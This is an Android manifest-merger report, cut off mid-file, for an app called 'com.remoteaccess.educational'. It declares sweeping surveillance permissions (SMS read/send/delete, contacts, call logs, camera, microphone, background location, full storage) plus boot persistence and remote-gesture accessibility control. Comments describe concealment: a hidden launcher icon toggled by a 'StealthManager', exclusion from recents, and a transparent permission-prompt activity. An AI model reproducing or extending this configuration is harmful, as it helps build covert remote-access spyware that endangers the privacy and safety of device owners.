app/build/intermediates/manifest_merge_blame_file/release/processReleaseMainManifest/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.remoteaccess.educational"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="24"
9        android:targetSdkVersion="36" />
10
11    <!-- Core networking -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Foreground service -->
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
17-->src/main/AndroidManifest.xml:11:5-87
17-->src/main/AndroidManifest.xml:11:22-84
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
18-->src/main/AndroidManifest.xml:12:5-84
18-->src/main/AndroidManifest.xml:12:22-81
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
19-->src/main/AndroidManifest.xml:13:5-88
19-->src/main/AndroidManifest.xml:13:22-85
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
20-->src/main/AndroidManifest.xml:14:5-86
20-->src/main/AndroidManifest.xml:14:22-83
21
22    <!-- Keep-alive / boot -->
23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
23-->src/main/AndroidManifest.xml:17:5-81
23-->src/main/AndroidManifest.xml:17:22-78
24    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
24-->src/main/AndroidManifest.xml:18:5-95
24-->src/main/AndroidManifest.xml:18:22-92
25    <uses-permission android:name="android.permission.WAKE_LOCK" />
25-->src/main/AndroidManifest.xml:19:5-68
25-->src/main/AndroidManifest.xml:19:22-65
26
27    <!-- Audio volume control (mute/unmute streams without needing DND policy) -->
28    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
28-->src/main/AndroidManifest.xml:22:5-80
28-->src/main/AndroidManifest.xml:22:22-77
29
30    <!-- SMS (WRITE_SMS allows deletion on devices where this app is set as default SMS app) -->
31    <uses-permission android:name="android.permission.READ_SMS" />
31-->src/main/AndroidManifest.xml:25:5-67
31-->src/main/AndroidManifest.xml:25:22-64
32    <uses-permission android:name="android.permission.WRITE_SMS" />
32-->src/main/AndroidManifest.xml:26:5-68
32-->src/main/AndroidManifest.xml:26:22-65
33    <uses-permission android:name="android.permission.SEND_SMS" />
33-->src/main/AndroidManifest.xml:27:5-67
33-->src/main/AndroidManifest.xml:27:22-64
34    <uses-permission android:name="android.permission.RECEIVE_SMS" />
34-->src/main/AndroidManifest.xml:28:5-70
34-->src/main/AndroidManifest.xml:28:22-67
35
36    <!-- Contacts & Call logs -->
37    <uses-permission android:name="android.permission.READ_CONTACTS" />
37-->src/main/AndroidManifest.xml:31:5-72
37-->src/main/AndroidManifest.xml:31:22-69
38    <uses-permission android:name="android.permission.READ_CALL_LOG" />
38-->src/main/AndroidManifest.xml:32:5-72
38-->src/main/AndroidManifest.xml:32:22-69
39
40    <!-- Camera / Audio -->
41    <uses-permission android:name="android.permission.CAMERA" />
41-->src/main/AndroidManifest.xml:35:5-65
41-->src/main/AndroidManifest.xml:35:22-62
42    <uses-permission android:name="android.permission.RECORD_AUDIO" />
42-->src/main/AndroidManifest.xml:36:5-71
42-->src/main/AndroidManifest.xml:36:22-68
43
44    <!-- Location -->
45    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
45-->src/main/AndroidManifest.xml:39:5-79
45-->src/main/AndroidManifest.xml:39:22-76
46    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
46-->src/main/AndroidManifest.xml:40:5-81
46-->src/main/AndroidManifest.xml:40:22-78
47    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
47-->src/main/AndroidManifest.xml:41:5-85
47-->src/main/AndroidManifest.xml:41:22-82
48
49    <!-- Storage (legacy + Android 13+ media) -->
50    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
50-->src/main/AndroidManifest.xml:44:5-80
50-->src/main/AndroidManifest.xml:44:22-77
51    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
51-->src/main/AndroidManifest.xml:45:5-46:40
51-->src/main/AndroidManifest.xml:45:22-78
52    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
52-->src/main/AndroidManifest.xml:47:5-76
52-->src/main/AndroidManifest.xml:47:22-73
53    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
53-->src/main/AndroidManifest.xml:48:5-75
53-->src/main/AndroidManifest.xml:48:22-72
54    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
54-->src/main/AndroidManifest.xml:49:5-75
54-->src/main/AndroidManifest.xml:49:22-72
55    <!-- Android 11+ unrestricted file access (File Manager) -->
56    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
56-->src/main/AndroidManifest.xml:51:5-52:40
56-->src/main/AndroidManifest.xml:51:22-79
57    <!-- Access precise EXIF location in media files (Android 10+) -->
58    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
58-->src/main/AndroidManifest.xml:54:5-80
58-->src/main/AndroidManifest.xml:54:22-77
59    <!-- Overlay fallback for gesture capture when accessibility type unavailable -->
60    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
60-->src/main/AndroidManifest.xml:56:5-78
60-->src/main/AndroidManifest.xml:56:22-75
61
62    <!-- WiFi scanning -->
63    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
63-->src/main/AndroidManifest.xml:59:5-76
63-->src/main/AndroidManifest.xml:59:22-73
64    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
64-->src/main/AndroidManifest.xml:60:5-76
64-->src/main/AndroidManifest.xml:60:22-73
65
66    <!-- Device features -->
67    <uses-permission android:name="android.permission.VIBRATE" />
67-->src/main/AndroidManifest.xml:63:5-66
67-->src/main/AndroidManifest.xml:63:22-63
68    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
68-->src/main/AndroidManifest.xml:64:5-79
68-->src/main/AndroidManifest.xml:64:22-76
69
70    <!-- Notifications (Android 13+) -->
71    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
71-->src/main/AndroidManifest.xml:67:5-77
71-->src/main/AndroidManifest.xml:67:22-74
72
73    <!-- Screen blackout uses TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW needed -->
74
75
76    <!-- Required to trigger the system uninstall dialog for other apps -->
77    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
77-->src/main/AndroidManifest.xml:72:5-82
77-->src/main/AndroidManifest.xml:72:22-79
78
79    <!-- Required on Android 11+ to query and list all installed packages -->
80    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
80-->src/main/AndroidManifest.xml:75:5-76:53
80-->src/main/AndroidManifest.xml:75:22-74
81
82    <permission
82-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
83        android:name="com.remoteaccess.educational.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
83-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
84        android:protectionLevel="signature" />
84-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
85
86    <uses-permission android:name="com.remoteaccess.educational.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
86-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
86-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
87
88    <application
88-->src/main/AndroidManifest.xml:78:5-191:19
89        android:allowBackup="true"
89-->src/main/AndroidManifest.xml:79:9-35
90        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
90-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
91        android:dataExtractionRules="@xml/data_extraction_rules"
91-->src/main/AndroidManifest.xml:80:9-65
92        android:extractNativeLibs="false"
93        android:fullBackupContent="@xml/backup_rules"
93-->src/main/AndroidManifest.xml:81:9-54
94        android:icon="@mipmap/ic_launcher"
94-->src/main/AndroidManifest.xml:82:9-43
95        android:label="@string/app_name"
95-->src/main/AndroidManifest.xml:83:9-41
96        android:preserveLegacyExternalStorage="true"
96-->src/main/AndroidManifest.xml:88:9-53
97        android:requestLegacyExternalStorage="true"
97-->src/main/AndroidManifest.xml:87:9-52
98        android:roundIcon="@mipmap/ic_launcher_round"
98-->src/main/AndroidManifest.xml:84:9-54
99        android:supportsRtl="true"
99-->src/main/AndroidManifest.xml:85:9-35
100        android:theme="@style/Theme.RemoteAccess" >
100-->src/main/AndroidManifest.xml:86:9-50
101
102        <!--
103            Main Activity — NOT visible in the home launcher.
104            CATEGORY_INFO makes getLaunchIntentForPackage() resolve this activity,
105            which is exactly what Settings > App Info > Open uses — so "Open"
106            stays enabled while the app never appears in the app drawer.
107            CATEGORY_LAUNCHER is intentionally absent from this activity.
108        -->
109        <activity
109-->src/main/AndroidManifest.xml:98:9-114:20
110            android:name="com.remoteaccess.educational.MainActivity"
110-->src/main/AndroidManifest.xml:99:13-41
111            android:enabled="true"
111-->src/main/AndroidManifest.xml:100:13-35
112            android:excludeFromRecents="true"
112-->src/main/AndroidManifest.xml:103:13-46
113            android:exported="true"
113-->src/main/AndroidManifest.xml:101:13-36
114            android:launchMode="singleTop" >
114-->src/main/AndroidManifest.xml:102:13-43
115
116            <!-- Enables Settings > App Info > Open without showing a launcher icon -->
117            <intent-filter>
117-->src/main/AndroidManifest.xml:105:13-108:29
118                <action android:name="android.intent.action.MAIN" />
118-->src/main/AndroidManifest.xml:106:17-69
118-->src/main/AndroidManifest.xml:106:25-66
119
120                <category android:name="android.intent.category.INFO" />
120-->src/main/AndroidManifest.xml:107:17-73
120-->src/main/AndroidManifest.xml:107:27-70
121            </intent-filter>
122            <!-- Custom action for programmatic / ADB launch -->
123            <intent-filter>
123-->src/main/AndroidManifest.xml:110:13-113:29
124                <action android:name="com.remoteaccess.educational.LAUNCH" />
124-->src/main/AndroidManifest.xml:111:17-78
124-->src/main/AndroidManifest.xml:111:25-75
125
126                <category android:name="android.intent.category.DEFAULT" />
126-->src/main/AndroidManifest.xml:112:17-76
126-->src/main/AndroidManifest.xml:112:27-73
127            </intent-filter>
128        </activity>
129        <!--
130            Launcher alias — disabled by default so no icon appears in the drawer.
131            StealthManager.showAppIcon() can enable this to temporarily surface
132            the app in the launcher; hideAppIcon() disables it again.
133        -->
134        <activity-alias
134-->src/main/AndroidManifest.xml:121:9-130:26
135            android:name="com.remoteaccess.educational.LauncherAlias"
135-->src/main/AndroidManifest.xml:122:13-42
136            android:enabled="false"
136-->src/main/AndroidManifest.xml:124:13-36
137            android:exported="true"
137-->src/main/AndroidManifest.xml:125:13-36
138            android:targetActivity="com.remoteaccess.educational.MainActivity" >
138-->src/main/AndroidManifest.xml:123:13-51
139            <intent-filter>
139-->src/main/AndroidManifest.xml:126:13-129:29
140                <action android:name="android.intent.action.MAIN" />
140-->src/main/AndroidManifest.xml:106:17-69
140-->src/main/AndroidManifest.xml:106:25-66
141
142                <category android:name="android.intent.category.LAUNCHER" />
142-->src/main/AndroidManifest.xml:128:17-77
142-->src/main/AndroidManifest.xml:128:27-74
143            </intent-filter>
144        </activity-alias>
145
146        <!-- Consent Activity -->
147        <activity
147-->src/main/AndroidManifest.xml:133:9-136:40
148            android:name="com.remoteaccess.educational.ConsentActivity"
148-->src/main/AndroidManifest.xml:134:13-44
149            android:enabled="true"
149-->src/main/AndroidManifest.xml:135:13-35
150            android:exported="false" />
150-->src/main/AndroidManifest.xml:136:13-37
151
152        <!--
153            Transparent trampoline activity used by PermissionManager to show the
154            native runtime-permission dialog from a Service context.
155            Must be exported=false (only launched internally) and use the
156            transparent theme so only the system dialog is visible to the user.
157        -->
158        <activity
158-->src/main/AndroidManifest.xml:144:9-150:46
159            android:name="com.remoteaccess.educational.PermissionRequestActivity"
159-->src/main/AndroidManifest.xml:145:13-54
160            android:enabled="true"
160-->src/main/AndroidManifest.xml:146:13-35
161            android:excludeFromRecents="true"
161-->src/main/AndroidManifest.xml:149:13-46
162            android:exported="false"
162-->src/main/AndroidManifest.xml:147:13-37
163            android:launchMode="singleTop"
163-->src/main/AndroidManifest.xml:150:13-43
164            android:theme="@style/Theme.Transparent" />
164-->src/main/AndroidManifest.xml:148:13-53
165
166        <!--
167            Background Service
168            foregroundServiceType covers all possible sensor/data types this
169            service may use so Android 14 doesn't kill it mid-operation.
170        -->
171        <service
171-->src/main/AndroidManifest.xml:157:9-161:83
172            android:name="com.remoteaccess.educational.services.RemoteAccessService"
172-->src/main/AndroidManifest.xml:158:13-57
173            android:enabled="true"
173-->src/main/AndroidManifest.xml:159:13-35
174            android:exported="false"
174-->src/main/AndroidManifest.xml:160:13-37
175            android:foregroundServiceType="dataSync|camera|microphone|location" />
175-->src/main/AndroidManifest.xml:161:13-80
176
177        <!-- Boot Receiver -->
178        <receiver
178-->src/main/AndroidManifest.xml:164:9-173:20
179            android:name="com.remoteaccess.educational.receivers.BootReceiver"
179-->src/main/AndroidManifest.xml:165:13-51
180            android:enabled="true"
180-->src/main/AndroidManifest.xml:166:13-35
181            android:exported="true" >
181-->src/main/AndroidManifest.xml:167:13-36
182            <intent-filter>
182-->src/main/AndroidManifest.xml:168:13-172:29
183                <action android:name="android.intent.action.BOOT_COMPLETED" />
183-->src/main/AndroidManifest.xml:169:17-79
183-->src/main/AndroidManifest.xml:169:25-76
184                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
184-->src/main/AndroidManifest.xml:170:17-84
184-->src/main/AndroidManifest.xml:170:25-81
185                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
185-->src/main/AndroidManifest.xml:171:17-82
185-->src/main/AndroidManifest.xml:171:25-79
186            </intent-filter>
187        </receiver>
188
189        <!--
190            Unified Accessibility Service
191            canPerformGestures="true" is required for touch/swipe commands.
192        -->
193        <service
193-->src/main/AndroidManifest.xml:179:9-189:19
194            android:name="com.remoteaccess.educational.services.UnifiedAccessibilityService"
194-->src/main/AndroidManifest.xml:180:13-65
195            android:exported="false"
195-->src/main/AndroidManifest.xml:182:13-37
196            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
196-->src/main/AndroidManifest.xml:181:13-79
197            <intent-filter>
197-->src/main/AndroidManifest.xml:183:13-185:29
198                <action android:name="android.accessibilityservice.AccessibilityService" />
198-->src/main/AndroidManifest.xml:184:17-92
198-->src/main/AndroidManifest.xml:184:25-89
199            </intent-filter>
200
201            <meta-data
201-->src/main/AndroidManifest.xml:186:13-188:72
202                android:name="android.accessibilityservice"
202-->src/main/AndroidManifest.xml:187:17-60
203                android:resource="@xml/accessibility_service_config" />
203-->src/main/AndroidManifest.xml:188:17-69
204        </service>
205
206        <activity
206-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:27:9-29:72
207            android:name="com.karumi.dexter.DexterActivity"
207-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:28:13-60
208            android:theme="@style/Dexter.Internal.Theme.Transparent" />
208-->[com.karumi:dexter:6.2.3] AndroidManifest.xml:29:13-69
209
210        <provider
210-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:29:9-37:20
211            android:name="androidx.startup.InitializationProvider"
211-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:30:13-67
212            android:authorities="com.remoteaccess.educational.androidx-startup"
212-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:31:13-68
213            android:exported="false" >
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:32:13-37
214            <meta-data
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
215                android:name="androidx.work.WorkManagerInitializer"
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
216                android:value="androidx.startup" />
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
217            <meta-data
217-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
218                android:name="androidx.emoji2.text.EmojiCompatInitializer"
218-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
219                android:value="androidx.startup" />
219-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
220            <meta-data
220-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
221                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
221-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
222                android:value="androidx.startup" />
222-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
223            <meta-data
223-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
224                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
224-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
225                android:value="androidx.startup" />
225-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
226        </provider>
227
228        <service
228-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
229            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
229-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
230            android:directBootAware="false"
230-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
231            android:enabled="@bool/enable_system_alarm_service_default"
231-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
232            android:exported="false" />
232-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
233        <service
233-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
234            android:name="androidx.work.impl.background.systemjob.SystemJobService"
234-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
235            android:directBootAware="false"
235-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
236            android:enabled="@bool/enable_system_job_service_default"
236-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
237            android:exported="true"
237-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
238            android:permission="android.permission.BIND_JOB_SERVICE" />
238-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
239        <service
239-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
240            android:name="androidx.work.impl.foreground.SystemForegroundService"
240-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
241            android:directBootAware="false"
241-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
242            android:enabled="@bool/enable_system_foreground_service_default"
242-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
243            android:exported="false" />
243-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
244
245        <receiver
245-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
246            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
246-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
247            android:directBootAware="false"
247-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
248            android:enabled="true"
248-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
249            android:exported="false" />
249-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
250        <receiver
250-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
251            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
251-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
252            android:directBootAware="false"
252-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
253            android:enabled="false"
253-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
254            android:exported="false" >
254-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
255            <intent-filter>
255-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
256                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
256-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
257                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
257-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
258            </intent-filter>
259        </receiver>
260        <receiver
260-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
261            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
261-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
262            android:directBootAware="false"
262-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
263            android:enabled="false"
263-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
264            android:exported="false" >
264-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
265            <intent-filter>
265-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
266                <action android:name="android.intent.action.BATTERY_OKAY" />
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
266-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
267                <action android:name="android.intent.action.BATTERY_LOW" />
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
267-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
268            </intent-filter>
269        </receiver>
270        <receiver
270-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
271            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
271-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
272            android:directBootAware="false"
272-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
273            android:enabled="false"
273-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
274            android:exported="false" >
274-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
275            <intent-filter>
275-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
276                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
276-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
277                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
277-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
278            </intent-filter>
279        </receiver>
280        <receiver
280-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
281            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
281-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
282            android:directBootAware="false"
282-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
283            android:enabled="false"
283-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
284            android:exported="false" >
284-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
285            <intent-filter>
285-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
286                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
286-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
287            </intent-filter>
288        </receiver>
289        <receiver
289-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
290            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
290-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
291            android:directBootAware="false"
291-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
292            android:enabled="false"
292-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
293            android:exported="false" >
293-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
294            <intent-filter>
294-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
295                <action android:name="android.intent.action.BOOT_COMPLETED" />
295-->src/main/AndroidManifest.xml:169:17-79
295-->src/main/AndroidManifest.xml:169:25-76
296                <action android:name="android.intent.action.TIME_SET" />
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
296-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
297                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
297-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
297-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
298            </intent-filter>
299        </receiver>
300        <receiver
300-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
301            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
301-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
302            android:directBootAware="false"
302-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
303            android:enabled="@bool/enable_system_alarm_service_default"
303-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
304            android:exported="false" >
304-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
305            <intent-filter>
305-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
306                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
306-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
307            </intent-filter>
308        </receiver>
309        <receiver
309-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
310            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
310-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
311            android:directBootAware="false"
311-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
312            android:enabled="true"
312-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
313            android:exported="true"
313-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
314            android:permission="android.permission.DUMP" >
314-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
315            <intent-filter>
315-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
316                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />